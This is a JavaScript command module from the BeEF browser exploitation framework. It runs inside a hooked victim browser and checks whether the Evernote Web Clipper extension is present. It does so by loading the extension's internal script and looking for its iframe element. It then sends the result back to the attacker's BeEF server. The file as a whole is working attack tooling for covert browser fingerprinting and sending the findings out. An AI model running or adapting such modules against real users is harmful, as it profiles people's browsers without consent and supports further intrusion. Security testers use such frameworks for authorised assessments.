//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var result = "";

	var s = document.createElement('script');
	s.onload = function() {
		result = "Detected through presense of extension content script.";
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "evernote_clipper="+result);
	}
	s.src = 'chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/content/frame.js';
	document.body.appendChild(s);

	var evdiv = document.getElementById('evernoteGlobalTools');
	if (typeof(evdiv) != 'undefined' && evdiv != null) {
		// Evernote Web Clipper must have been active as well, because we can detect one of the iFrames
		iframeresult = "Detected evernoteGlobalTools iFrame. Looks like the Web Clipper has been used on this page";
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "evernote_clipper="+iframeresult);
	}


	setTimeout(function() {
		if (result == "") {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "evernote_clipper=Not Detected");
		}	
		document.body.removeChild(s);
		}, 2000);

});

